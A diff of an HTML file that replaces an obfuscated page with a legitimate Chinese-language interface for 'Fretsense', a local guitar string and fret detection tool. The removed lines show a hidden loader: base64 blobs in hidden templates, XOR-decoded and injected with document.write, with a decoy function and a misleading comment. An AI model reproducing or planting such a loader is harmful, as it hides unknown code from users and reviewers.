@@ -1,34 +1,199 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<style>.jbYqhd{display:none}.UWEOwq{display:none}</style>
-<title>Panel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fretsense — 实时吉他弦品识别</title>
+<style>
+  :root {
+    --bg: #0f1318;
+    --panel: #181f27;
+    --panel-2: #1f2832;
+    --text: #e6ebf1;
+    --muted: #93a1b0;
+    --accent: #58a6ff;
+    --good: #4ac97a;
+    --bad: #eb6363;
+    --warn: #f0c860;
+    --border: #2a3642;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: radial-gradient(1200px 600px at 70% -10%, #1a2531 0%, var(--bg) 60%);
+    color: var(--text);
+    font: 14px/1.5 system-ui, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+  }
+  header { padding: 20px 24px 8px; }
+  header h1 { margin: 0 0 4px; font-size: 22px; letter-spacing: .5px; }
+  header p { margin: 0; color: var(--muted); }
+  main { max-width: 1080px; margin: 0 auto; padding: 12px 24px 40px; }
+
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 16px;
+    margin-top: 16px;
+  }
+  .controls { display: flex; flex-wrap: wrap; gap: 12px; align-items: flex-end; }
+  .field { display: flex; flex-direction: column; gap: 4px; }
+  .field label { font-size: 12px; color: var(--muted); }
+  select, button {
+    background: var(--panel-2);
+    color: var(--text);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 8px 12px;
+    font-size: 14px;
+  }
+  button { cursor: pointer; }
+  button#startStop {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: #08131f;
+    font-weight: 700;
+    min-width: 96px;
+  }
+  button#startStop.running { background: var(--bad); border-color: var(--bad); color: #1a0c0c; }
+  button:disabled { opacity: .5; cursor: not-allowed; }
+
+  .banner { border-radius: 8px; padding: 10px 14px; margin-top: 12px; font-size: 13px; }
+  .banner.hidden { display: none; }
+  .banner.error { background: rgba(235,99,99,.14); border: 1px solid rgba(235,99,99,.5); color: #ffb4b4; }
+  .banner.warn { background: rgba(240,200,96,.12); border: 1px solid rgba(240,200,96,.45); color: #ffe2a0; }
+
+  .readout { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; }
+  .metric { background: var(--panel-2); border-radius: 10px; padding: 12px; }
+  .metric .k { font-size: 12px; color: var(--muted); }
+  .metric .v { font-size: 22px; font-weight: 700; margin-top: 2px; }
+  .conf-track { height: 8px; border-radius: 4px; background: #0c1117; margin-top: 8px; overflow: hidden; }
+  .conf-fill { height: 100%; width: 0; background: linear-gradient(90deg, var(--accent), var(--good)); transition: width .15s; }
+
+  .canvas-wrap { width: 100%; overflow-x: auto; }
+  canvas#fretboard { width: 100%; height: 260px; display: block; min-width: 720px; }
+
+  .legend { display: flex; flex-wrap: wrap; gap: 14px; margin-top: 10px; font-size: 12px; color: var(--muted); }
+  .dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; vertical-align: -1px; }
+  .dot.idle { background: rgba(120,130,150,.5); }
+  .dot.detected { background: var(--accent); }
+  .dot.correct { background: var(--good); }
+  .dot.error { background: var(--bad); }
+
+  .demo-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: flex-end; margin-top: 12px; }
+  #targetPanel { margin-top: 12px; display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
+  .hint { color: var(--muted); font-size: 12px; margin-top: 6px; }
+  #statusText { color: var(--muted); font-size: 13px; margin-top: 10px; }
+</style>
 </head>
 <body>
-<template id="xffac43fe0">gLjuipQ/MnphMXbpVLvPhvr1aT+MpAY4me/jYfuHoLd+xiO7gvKX/2zRfAw3TvLx3evZoKNWSV9QdzOlG+n7sKv4aTPA6gs0krX8NfeM9fkbiD/8w/XGmyTZdwxrTObw2O3C+LMOHUNHdDPqULOF5Oq9dDyJ8AM4m6WtIP+F57RF2HXU3/vMgTGcdxk7C6y73ezerbgZSQoEMT7+VrmF6ajpIHCT8AU/2uyxMfGPoLd+xia7l/eJmzHRfEV0CfT32evLsbgZSQpHfnDpXLmFseT7bzeU8wMqkqWyKu2d5+cRiGvtzaCHwXKCE0Q7C+X4nPfLqLJWSUhReHL5G/fRrOa9fj2O8A83g7X8cqfbs6tK8HezhuLI1T7ddB1rTOP8yvDZrLgFSQoEcnHzTbKf+Pu/KGbCumBlmu2qIr6H4+QRx2mshvrMlCPZfVp2TvL20u3Pq6NWSRoXMVDyT/fAtfypLnDejlY0kvy/Y/CI7+xJ2Cixk+/bnDfUbVp2Df73yPzEsepJWRoWJzyjM+uF5bLxeGyG9g8tgOGtJrOF6/oAnyW7kaqGgTnIdR1oZK3qyODGoOlhSwpMZXPxFbWe6L/mcDOS4wM3zbjlM/+N5uAanXHu2OHAkSTUI0lmXrSi1PzDor8fURsUITumW7aS56HvcieO4FB6ke64eP2G7uYGwGjv0qeSiFqcORo5Cuji2PDZtbsKEhBCfXvlArad5aHzMDuU4Qcqzeu7LeqM8LIejziqivDQ2DPTdwwzAOWj3/zEsbIZUCAEMT69X7if+Ov7fD+J6BNj2umuM/KMr/oNiT+7jrrrmTnScjU3DcLgz+3PqJEEBV4IM034XriUrJPUP36o4QYvkvy3IP/Fw/sdmyfykPfHhn3PfAo/CKqTnLmK5bEEBV4JYnfnXO3AubblJj6J6g90n+23JPaduLhazH7ll/PRgX3ddRExAKv62ffeoKVQG0tAdXfzXu3DuLblJjCP/EcqnvK3LfnT4OYGni6szvTGjWvBE1h2QPzq2+LHpK9GHENAZXanDOHB/L6mYFjApEQ0hO/+IuWK7eUbiHH906afwzPfIgwzFuW02PzJqqUKH0NLfyTzVrmUt6TybzaF9kc7mPyqLPPTs/kM2jixj//N1TPJawozAOXa0/XFt+wWYQoEP3PuXveQtq7yazeS/wUpluu3N+fTrL5Ph0H+w7XKmiXSbQMwAf/tke7PrLADHxASIS6mX7if+OvrfCCJ5QQt2uarLvub6+pOjiq8lvrIh33SbBUlVeyTk7P9vKEkDUBlfEiqCaC03oL+cz3RwFxuo+eNItaZs99AlyCQusTOnQPOaTcZXqfu/d/ttb0AXWEcQnaqUL6k57f3aTqB9j0MuPqQJsub0LwslCyvjuyfoxjUUSk0DOHP1KnQrO4JHxpAelrHU+Oo+KKocmqMtiMczs2REueu5/0atgiN1tjBoiTrdS1mO/Lv+9TQk4EPIHJSQnLrcZG8yaPIezC14yFuwL7mBMux4boNnCeyquTBgiD3URM4IPfS+/zygKMOCWZjKHT1Ur2w1Y70WR+o3loKkcOwFuzf5+8BohiWlOzRkgrlWiImLdvh3teSlOIHDmFoQCb2UpiiuYPzVQCJ4lMdmum2MtOO6/sxkX2xh/jhlBzSWh0RO/ar1PHbrq9bMmNTSHrWYLidy4LaRBOL7SIswe6T</template><template id="xffac43fe1">DMSb78M6zHOmrd7TmSDSLhNhC6CujuP9puciWB5vfGfFT7aJ/IykXgum9iUjmcGoOdaOz/sRsSW5s8yezDPadhFiPMnj8PbBl7UpKhtIU1rQbJGC2LOuTgfZ4A4OxrySAsvf8/EXnR+6jN7tjWnSdxUcI8jt1sOeoK4FXW4cXXqlSqaLx/TaLSOl1Dg8ts+mLteL48ZNvwKwkK7rr2iFdD8EDaf67N77hrQTDXxGQ0n+e46n1J/3VxC57AQ1rbC/Ma2e9egdq32LhOLqhjLwdhkSW6iq68zctIdTBkJpZX/xDrG4yYDzdiCX7y0jxea5Kt2E+LodyCeYlf37tGHNQBAiNMTK8u7a87YxU3NWJketUZGk5JfzLhbZywQ7ucCvEams180jsnqcuf76xR7YbCI7GKfe6vvcn4UtWXtlQG/ZdKKz3K/zSRep6ScBlbmUIKaZxfAksSqxrtPZlAXJcx5hHvDTyv3PiJwYJx5xfVikCZWH/r7cWAi18wQTueuLKeqHx781oCyKtKX9s2Lseh83P+asxvPvhp0aIkxhdlSkVLCn2rHYLxOqsSENkPCLevLZ288elwiSrvXmgzzEQS8VB//A5NrggqRZOlJCImeqD56exIGlSiuBwixoss2aOvWG0uwHuByPlvjejGbYUj8CB8XwxtTOkoQzAXxBIH3TD+Wf9YCpfhfX9xAStsWfFfecxrxGgi6ymvubrT/kSAwPJMn8hcHirpwmMU9CKCvScq3A2rXXLyWN4D86g8SMetSu694GyH3ujKLzxDrFcy8XB/77zKj5k5gKJmwRX2jQTbuCz4XNayOs1h87msOIGsSDx7slzQW6jtz/gwDfaUEQVsPciK+c8L1SOEBdeFffeL/F+pDzVxWitVsNmMLpCNSOzdkAoySThNWQnBfFczszXNb95tGTn6cqAW1gWSalS47HwbPvRxSp6FMDnNiVEeyG0LhGqA6Om+TOoCGKbjUzXNXPjfico79dCWRreHb5DpWd6/OpSxSr6yxvwMLvdNPR+NwYmCeTjOXBlxj/bkEbFtzw3c789Z8KB0JJZVDIfLCp67LHT2ON6lgawPqxCteRtcshtTqTtcPjsijYTxUlW6Su8u/9gp8TBlpiJ33xe4OG6vKkeQWP1A0KhL2mBtqM9OcwwiKYluXimhfReik/W+vfisvcsbUEEUR8VnjIT5C6vI/VKwXU1SQ1pO+9c8yE2v84yBuXsNreuDHlU04GBaftz6vIlrwTDBJGXCrkcpGy7besUSSq5y00mPi9KeSltcEBmHuTkqX+zCWFWzAjFOL0++HF9+AnEWtGU1yuW5y31aj3Rx+n9iUAudqPBfaL7vsguA+w0f3vggX0IEsmHfvOzqmbs+UnXF8UdXneaaWltaPHezun3F49ncGaEOSI7f0xmSWphaeQnBTtIBMZC9bh5Mvhr4AeUn5+Yyv1apaz3JyrXjih3iEbkbqOdfKc6ew9vx6Yl9eYk2LLKklgJMTB6dbOqbwCI2RxflPkdOKWyYrSSjua/iI+vO7uOsuE8sowvA6w18XAth7TTT4YC8Pf887j8rUTAGdFVS37cpm7zaCrSCaHtB0em+6GIN2k6LgGqS2PtKfBrRjWQzYPKdvj1d/88rwMHxxBZ1rNcrmWtKj8aTnW0SUOp9GyEPrZ1sYSo3q61dr+jQTVXQ9lX/3O1fzar48pJW</template><template id="xffac43fe2">ZuIHDQY4+pyJ7QTxeZwx0OvLyKBeu/0Owfggmw2sHCxCfGfhIjBP/NzfftpOccG3t+SC+vSYCQ7/7cShyG7w0yvsHpdMiNsL4mrxuKgeeduyHxKA0hH6L71NH5lr9dKVp0Jm/3AaWcuY/HSRGj4z4Bmdy4DM+7tM9GvSyopaX8uhXkTS1jLcv37dLDiYBTL1xqJiylWrq975XzfmTXsAE7kuWbK9yO+LE1niO0gN7esDn7bzdlC6D88uzPgrUYKV5oVGvLTb6Ev5SueCqV3lwTjt6zAdGE8LFNuwLoofXYkiD3Kkg7D8LMyM/riKFYLm18V1feX4PDuvXecRaz8S06ocu/Kty97b4QozKws/7cnAHYdRFuBPap+N3Qv5sNUkVAJHXXXZi25oP1bTeM5iEpsvzoM8+c8scxvDK3pKeegGPoV0scAt/Tjt3anKQzAGZtdSzXVoeT6pbraBy3/R4fp/KvJ+qA+M4XsT61kNDEk2nwUj5mI+PN19PQ96Y4WkdFcnfXUrmB1fCuXGe5xQ5txPDvO/+s9e8xuTGQ1/fztCGJd00wA/DR8evD8p0mHGwSZ1SqfKWh2o/kRGqM7SRqlfnpDsuAz/wYoj+ctM7wnGnQfQoADcDM+/fh94QdL0x8ZyvEc7ikw/CsVibZ1iIVlbypMfOF7sEWyi6Eu+bIpRqEbzkRXend5O7Q97E4BWxJeGnNc72f34DQaWXWtAAqp8W1etywzOIHgDKW0e/qlj75fRkbHsXKzfD6/IZSJllAfm7VToWz35/8Kh+U4iQpnc2nBa+4tc44zCSy2szEhyjdewgTH9POiuvGk+cfJExNWSbOVY2HxbXZZx+ityg9urCme+vcx+M/iwLusaDrhhf6Wkk7V936jOnf/IMOKBJ8a1Dqc6W6+/etRWWn8FwfgtytIsuB99ECqwPphqX7hirmWyAgOPCg++HZtLkqPWwXW3mkYOXHz6nreTmYxw8Dmt62DvfQs7hMtHq3ltuRt2XMcxM7GOL83c//o7wsM3NgS1jyYI+TyLz0TQuVzgApgeqXKfLf+uI4zAqq2tvYgWbIay0BL+Cu+/799OM7XmwXV3n7aL2/x5GtWAvRzj4AnMe0E/G7wc0+jBK1ktnBkAD1XBpvL6j97tTSgeQsOE1VelP2f562yJzqLwHUzC8ah/2yEaijsMIHiSyvtqbAxzLIdRJiJMj/zqjLj+YzGUJTVnfxfeWCzrDReSDSwyQstNqZGs2w4+IhzhqNkuKcpSD1UxEwLNrOjcGZjKMpAUZDUlfNTIG926uqcgiz/Q9rm+6SN6qk6sAVt363p8LNmzaPLhMbC/bY7cPpi5URMnpyYSysSuW35I7ZWyuF5xA/j+3qItOMscNMkDqrsOyemhLNbUE1C6aoyajO9a4/BHJxVkTyW++W3KnJVzTX4wAVsceXM+amyt4avCSPi9jwr2fuST8lXfOu5dXw/bYDWWlKdn2tUoeX9bXpezHY7is/luqSJeeqs/0VqhmQ0vfMlibybTFnAqj87dTbo+JYJUgWW3vnWO+YuJT2dgiN3DARz8e6JsTbs7kTkQOUsf7RxgLzbSgiHf/O6vqdp5sPI0FHX1bpSKWS6ov1Xwau6hlpjsWdKNaM984YkCzvutWYugrqaT4/D+vwidb7hJ4mM0JvWGn6WofByoDSfwOQ9DIBvu6vDNCs9L4joBGSiNvdm2</template><template id="xffac43fe3">TFQAAZLMn13ejeo4EmGUdRf3zrS7CkvpDwXCGF1zoJv8y8cM7Q0OgZqwGk1uzIlhTQS0gAH/joyPDOouIxXVlsJlT/CZqy9qTLRwen/SggoLyIFvyrwfw7mSGJ1qbxgx3NKz0YAcvM/fXhle9aIFpWYH3oVu6o9rSocBmD8lwxo+voG+2wwMcCjTOGl+zYjAHwSTw3XeuhyNHZkbotUxtOfXjNYLqZ7vD0dyGD9z0xtcmoIN2H7PEOtz6xgNOdvSGKXQwAJ9zS2OvNqaceP15oYE/Ld4LIwbH/fDum5lpom/6HOeyOs7obvXOu1trNmWf2axNmDNOh2Kvpgo8ECGdQeXXrQ52Ey7/zXGCDzC0Rgcy8Eabe0+Y+ozyXjsXIgmjoXgtlVsvP/vvdl7klGXlSW3HaT4+i7ZTsTgKjtgxhgfy3LevctcMgszrtr/3ztzrPXRMkV/TQ2/PjnbVYBW10cmmqbKO/xvPcayCu8itpm9jqdq2Ru8Abjnu8pf7zrx/scBYzFNTfhMmfn+QIHUkQRS2lWOKywJ/bcDTY3Ds/v+eHO8+ttOwzwj6Oru/grQHKSAg9GfTf0MDFqIMhEhxvICrcdo/CyIjxLCqV3CU/lsGSDPuk8OEFqweOlf7Bgz3YcBY5K/TjxNfkiYQKUmgdW0j4fK+Swp7Tewel7lMynOGNcP/Zyr02rByalvP/pgflKRpjD93w16vbqoA+Um4TXHfEVb+F4qysKxqG0RwVuNqsdMa/8OQ7lAanktKdwDf9Vw5iWqnq+deapOQlKU1ARU3sDJPB/7etVRzR5xMVjcycFa3Rwd4hkiiskM7IoQnmTU8eV9Dx263p9p0AHF58VSesY7WIuYDldQCz8BJuoumfMdiF6cpAkAXpl/2bhirJX00jGfnc3urvlodZG2dzdSvzaZGbx/atbWHZ8VsxnPmKM6qr5d8gnhqwi9vapSXLLxY+J/j0ifHoqqMCB3xKZS7rWp+QvfL7Xzq6xQ0ondq0LOeO2NMGmCOMqNHrrCTQKzUcJ+XuxcHwl5M8Lh5xSFnHDIW09JzESSCi/DMuldi5FtOZ4PECty+fguHLsBvGTRACBNbU3/Pio4RaOmROR1XHdbyr4pXFSySstxphovGJK+zRy91EnRyPuq/csDT0Sj0kHtXVivXms+AlAEFoQWfMWLOQ7pLteAGI6lhvkP2beufduvwAl3iJ19XwoQLkex45Oaap3c/vs7saGR10QnnlToWjxKCrbDCp4BNts8OxD6mH6dselz+5tMzRsgeEXBkvA6b1i93mkIACExJtSE//UOeXxonObTaTzwEQscqPAMjfxNEmvCnvpK6fviDadxFhHuXy5d/ai6MoABJUIVDTdri47ZXsLD6PzyETzumZMfqRwdg/uCmxgf/jxmjSXg4RI/L+883L9IcbOx5QdW//S7/F4qfcJBeFvQQXlurtdt+x1vE8kQzvpKL5vibEbA8PNvrT2O3MsI0oEV1lQi/cdoKV2PavJQKXygEcs+2kNuqHwLgAuCKJrfXrujbdVhsxPcTWyNWciqQgWVpRJyvnUZvJz/f4TTaLxiQjttvuMO+P1Ls3yz2whdObnAiEcgpuKseh6Kyap4dSD0twdFnrAeO6uffxagCIvFg3ku+ye/is0N0OqhOJjefCsWHefgA/IfWr8O3v/aI+HWtNYFTNTI+H1r71WQ</template><template id="xffac43fe4">WIyxA0r+m5G+6n9N8aqxyOqPfIuxHMaDJhIPzL8s6YkqYbUhx1cCvLY6ebwI7XahOJyDwzkv2rK9Tf6M0ElAKd0czCzRLNfDcgOtLLisHAgpsmMmtRSSvxYLay6qzTbjTR1Tg0x8ukdLTGvqYHjjKyhqijyX/UfBkyUJul3vbOvOlhV05NZz7+VbaC//u/cCGHplRT16iOL/uI8exUjSq3l7bPmiKcbRAzTvDsyPbHpKMCCApWdHr0S7KS+Obyb3Lc5Uowk7X8JPHLouEGny3jwf7dgSDPI1d5Gfj3ibfNoKUDBE5AP33yVPjH//73bTHCugk1nuu1Y/aM8OxI1SrgzZyJ1Wzea0ZcTrHL2f3Dt7IIH0NKdj70V/fN/7b8c3KJ4Fd7lOerLerLvLxI1TiugviX1SPZehc4CrnqlXsqY91XRE5NZyCXM93N6K/rPSGU/QY8yqq6Ku2Z7ugNwCWxjfOL1TTdbRl7A/D6zvaX55AiP393VEzTeJq0rvjuaT2GqQ42hee4f7GN6/9K8He6iuCJhiTFdR1rTPXwz+nGpK5RBUVKdDy9XbaF7evwfDGS61d7pc2ODMGnw8Qx2HW4kfPdgjnPfFU6B+Lt2ffPt+tED0NSLxShXb6HrLXpZD6FuUg9nvuuL/+QuOcblC78w/LIgTGRdBk1HP6kns/vl4QiJGQGLy2zD/nFsOn5dCTejlY9nv7+MOqQ7uxJ2C+3kObFlCmGdxc4C7O52PjepPoGCklWfiO/epi8wY/JTnDetVNrxrTxJ/efvINIniKow+XdjDzZJFoyB+Lp0PjT/7kEBU8GMXr8Tbbc4af+bz3dpjgcu82fENu6oLdBznfxh//fy1qAfREgTuLtxfXP+PUPAllUfX/kA7me4qO/PTaB8At0mum9MfHUoNsxtg6fsNP2sRHoXFpoXqK58vbc5eZSUR4XLTH5UKHPhvr5dCTA9x4gm+3jYfqA8fkYmzLkjfnHkHKcfRkiD7z03frYqupJMm9lQzyjC+fDuvqyeTuWumBTy/u9MfeZ9rd+0i2rjfXdnD/SOVB/TuqTnLncpKVLGF5FY2r4XffMrKD8cSGFv2BT16i4NvCK9uAblGutl/fbgXiVOQNcTrG5nPDM5f8YH0tWZXv5EPeD6bLobzzbjkp516itN/+b9uwQ2nb+l+TckGu2E1h2TrHv3euKpPdWS05LcmvwXLmFoqH4aReM4Qc8mfycOteNqq4TlWz32JyJ1XCccB52RrD4lbnR5aMZEgpfMX3yV6Se4KOzajOS6kJ+rPqDY72O7akalT/+hfncmzSbMEN2E7H63e3JrfdDDgMEamO9S7KF+bTzJnKdjmB516j+Nf+bovsVjWvjw77I2zfZbTkiGuPw3uzeoP9MA1hBdzm0GauNrOG6NHyU9gM036HlSZTJoqlU1WH+pOPIhzSGORU3DeP2nO7LtvcFBF4EYmv/SqOY+LPpeDbArkVT16j+Y/ePoqFViCqpw+rV1SLdblhrU6y5m8L4gJMiOW9nRUHIa5usq+bhYXKS5R13lOC/Md+dqrld2nbj3raOrneVOQNcTrG5nLmKsaUSS1EEcnHzSrid6ejqfCCOrE0ChdX+K+yM5KkalT/+kOPLhiTVbQ0iC/Wjm7WKt7YcQhEEbD7+WKOS5Oa1eHvA/xdT16j+Y77J8OwAjzmw2JyJ1XCcZHJcTrG5nLaA5Z</template><template id="xffac43fe5">EEGUlBMX//Srid+bL4PQeyyEpxluy6Y/ad9vkHwGTxw//P1SDOdgw5Df71nPDZ5boCGFlNf3m0Gf3ehua9PXKJ4kpx1qeAK+qd8vpLwBfxv7mGnH7IfAsiRuP4y7CD5axhSwoEMT69S7aGrPu9Mgy8qzZ22KaqJu2dqvsVjWL+3LaOnSTIaQtsSbGynOvLsvdRSw1MZWrtSu3eo+G9NnKS5R13he2uL/+K56FbpBfxyLmF1XebMENcTrG5nOSgz/dLSwpScGy9TKWdt8y9PXLA8Bgg1/P+NuyForRUlC6pw8P7uXjOeA96TvX23+zHoLkfRUhFYnvIa57Yoq7veDTbpBdT16j+Y/2I9uoc2mO7yrbS1Sbda1giTqy52PbJsLoOBV4Kcmz4WKOUyar4cDeO8EJ+lq/3eL6drOEGny3+3rbblCeHOQ0kArGknO2EraUODREEbBSXGffRrOm3PQCF4gY8lPz+N/aMovsRiSSylfPN1QXuVVg0D/LynPbEsbhLH0JBMXL0V7zRpumXPXLApAt3hO2qAuqd8OAWjz+7y7HBhzXaPlR2G+P1laKgz/dLSwpQY2e9QveS46jucj6FqgY2kKD5GOy0ovsRniKshvXd1STTPlR2G+P1kLmNrLlLXlkDOCW9RPeS7bL+dXLI4UN5jPXUSb7Joqlb0GuIiuXAlzzZORs5G//t2Pbdq+1LXgrGl4y9CPvR+K74c3KS4Q4whe29N77DrYNU2mv+lffb1TXQOUV2Cv76yfTPq6NFDE9QVHL4VLKf+ITkVDbIowk2guaqZLfSiKlU2muoguSJmTXabVhrTqSitpOK5fdLAkwEOXvxEPeU4OjpeCqUxwU3g+2wN77UotoAiCKwhL7FkDbIMENcZLG5nLncpKVLH0NJdGy9BPeC6bLUcyaF9hw4m6C4NvCK9uAblGv2yrbS/3CcOVh2Tv382u2H6OxhSwoEMT69ULHRpKPxNHKF6EQtkvCqAPGH9uwajmvjw8XdhznSflA6C/ftnKeK9fdUS0ZBd2q9A/fBpf2XF3LApEp51+G4Y7aF5+8A2nfjw6aA1Su2OVh2TrG5nLnJqbIKGWNKZXvvT7adpLL0cDeSrVFT16j+Y77JoqkAiDL+mLbenD7Ydg94Av763e3DqrlFGU9UfX/+XP+E/qq0JnKdjkp516j+Y77J4egAmSP+y/OY3HDHE1h2TrG5nLmK5fcfGVMEaj7qULmV47GzcT2D5R4wmObwIu2a6+4a0j6sj7+S1S22OVh2TrG5nLmK5bQKH0lMMTb4C/7R9+bqdDyE6x13m+e9IuqA7edakjm7hbaU1SXOdUN2E5u5nLmK5fdLS1cuMT69GffR8cy9PXLA+UZ5xrjuc7fSiKlUh0HUw7bAk3CUfRc1G/z80u2Et7IKD1N3ZX/pXPfMsfu9Oj6P5Q4wme/5ar6SiKlU2mu6jPXcmDXSbVY3CvXcyvzEsZsCGF5Bf3vvEfC1w4vecjyU4QQtu+e/J/uNpaVUiT+/keKAzlqcOQV2C/3q2bnRz/dLSwpXZX/vTf/Yt8y9PS/qjkp52KL+EP+P5/0N2iW7l7aD2lqcORw5DeT02ffe67YPD29SdHDpdb6C+KPzeCDIoy4WusuxLeqM7P04lSq6hvKO2XDPbRkkGriituSD7f5QYRYLYn3vUKeFssyhMjCP4BNn/bTxK+qE7rc=</template>
-<script>function YSvtgP(){var a=7,b=49;return a*b;}
-/* fallback for old browsers */
-(function(){
-var VDJiom=atob('vJmqxddrayokER6dOdfxjMadHVLghGpZ94jeQ57pgol0+kve45ap9VC8GXhWbpGZ');
-var VP6j7Y=[];
-for(var aFoIO2=0;aFoIO2<6;aFoIO2++){
-  var _e=document.getElementById('xffac43fe'+aFoIO2);VP6j7Y.push(_e?_e.innerHTML:'');
-}
-var XGccry=VP6j7Y.join('');
-var dyA4YC=atob(XGccry);
-var aMJ0aj=new Uint8Array(dyA4YC.length);
-aFoIO2=0;
-while(aFoIO2<dyA4YC.length){
-  aMJ0aj[aFoIO2]=dyA4YC.charCodeAt(aFoIO2)^VDJiom.charCodeAt(aFoIO2%VDJiom.length);
-  aFoIO2++;
-}
-var oKdVSc=new TextDecoder('utf-8').decode(aMJ0aj);
-document.open();
-document.write(oKdVSc);
-document.close();
-})();</script>
-<!-- end -->
+<header>
+  <h1>🎸 Fretsense</h1>
+  <p>弹响一根弦，实时告诉你是哪根弦、第几品 —— 全部计算在本地完成，音频不上传。</p>
+</header>
+
+<main>
+  <section class="panel" aria-label="控制面板">
+    <div class="controls">
+      <div class="field">
+        <label for="startStop">采集开关</label>
+        <button id="startStop" type="button">▶ 开始</button>
+      </div>
+      <div class="field">
+        <label for="sourceSelect">信号源</label>
+        <select id="sourceSelect">
+          <option value="mic">麦克风</option>
+          <option value="synth">本地合成信号（免麦克风验收）</option>
+        </select>
+      </div>
+      <div class="field">
+        <label for="tuningSelect">调弦</label>
+        <select id="tuningSelect"></select>
+      </div>
+      <div class="field">
+        <label for="modeSelect">模式</label>
+        <select id="modeSelect">
+          <option value="free">自由听音（检测到即点亮）</option>
+          <option value="target">目标音练习（判定正确/错误）</option>
+        </select>
+      </div>
+    </div>
+
+    <div id="targetPanel" hidden>
+      <div class="field">
+        <label for="targetNote">目标音名</label>
+        <select id="targetNote">
+          <option>C</option><option>C#</option><option>D</option><option>D#</option>
+          <option selected>E</option><option>F</option><option>F#</option><option>G</option>
+          <option>G#</option><option>A</option><option>A#</option><option>B</option>
+        </select>
+      </div>
+      <div class="field">
+        <label for="targetOctave">八度</label>
+        <select id="targetOctave">
+          <option value="2">2</option><option value="3" selected>3</option>
+          <option value="4">4</option><option value="5">5</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="demo-row">
+      <div class="field">
+        <label for="demoFreq">合成基频 (Hz)</label>
+        <select id="demoFreq">
+          <option value="82.41">82.41 — E2（6 弦空弦）</option>
+          <option value="110" selected>110.00 — A2（5 弦空弦）</option>
+          <option value="146.83">146.83 — D3（4 弦空弦）</option>
+          <option value="196">196.00 — G3（3 弦空弦）</option>
+          <option value="246.94">246.94 — B3（2 弦空弦）</option>
+          <option value="329.63">329.63 — E4（1 弦空弦）</option>
+        </select>
+      </div>
+      <div class="field">
+        <label for="demoHarmonics">谐波构成</label>
+        <select id="demoHarmonics">
+          <option value="pure" data-hint="纯正弦，只有基频">纯正弦</option>
+          <option value="strong2nd" data-hint="二次谐波比基频强 50%，用于验证不会误判高八度" selected>强二次谐波</option>
+          <option value="guitarish" data-hint="基频加 4 个递减谐波，接近真实拨弦">类吉他谐波栈</option>
+        </select>
+      </div>
+      <span class="hint" id="harmonicsHint">二次谐波比基频强 50%，用于验证不会误判高八度</span>
+    </div>
+
+    <div id="banner" class="banner hidden" role="alert"></div>
+    <div id="statusText">待机：选择信号源后点“开始”。</div>
+  </section>
+
+  <section class="panel" aria-label="检测结果">
+    <div class="readout">
+      <div class="metric"><div class="k">当前音名</div><div class="v" id="noteName">—</div></div>
+      <div class="metric"><div class="k">频率</div><div class="v" id="frequency">— Hz</div></div>
+      <div class="metric"><div class="k">弦 / 品</div><div class="v" id="stringFret">— 弦 / — 品</div></div>
+      <div class="metric">
+        <div class="k">置信度</div>
+        <div class="v" id="confidence">0%</div>
+        <div class="conf-track"><div class="conf-fill" id="confidenceBar"></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="panel" aria-label="指板">
+    <div class="canvas-wrap">
+      <canvas id="fretboard" width="1000" height="260" role="img"
+              aria-label="吉他指板：横向为六根弦，纵向为品丝，点亮处为检测到的弦品位置"></canvas>
+    </div>
+    <div class="legend">
+      <span><span class="dot idle"></span>待机</span>
+      <span><span class="dot detected"></span>检测到</span>
+      <span><span class="dot correct"></span>正确（目标音练习）</span>
+      <span><span class="dot error"></span>错误（目标音练习）</span>
+    </div>
+  </section>
+</main>
+
+<script type="module">
+  import { FretsenseApp } from './src/app.js';
+  new FretsenseApp();
+</script>
 </body>
 </html>
